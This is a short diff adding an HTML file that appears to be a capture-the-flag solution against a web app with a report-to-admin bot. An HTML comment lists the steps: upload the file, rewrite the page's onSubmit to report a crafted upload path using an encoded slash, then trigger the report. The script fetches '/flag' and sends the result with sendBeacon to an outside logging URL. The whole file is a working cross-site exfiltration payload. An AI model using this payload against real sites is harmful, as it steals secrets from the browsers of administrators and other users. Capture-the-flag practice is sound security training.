@@ -1,0 +1,22 @@
+<!--
+1. upload this
+2. replace onSubmit as below
+
+async function onSubmit(token) {
+  const button = document.getElementById('recaptcha');
+  button.disabled = true;
+
+  const result = await (await fetch('/uploads%2f209992da-b71f-4f1f-85b9-0b8ca0ea50fd.valueOf/report?token=' + token, {
+    method: 'POST'
+  })).json();
+  button.textContent = '\u{1f6a9}Thanks for the report! Queue length: ' + result.length;
+  button.disabled = true;
+}
+
+3. push report button
+-->
+<script>
+fetch('/flag').then(r => r.text()).then(r => {
+  navigator.sendBeacon('https://example.com/log.php', r);
+});
+</script>
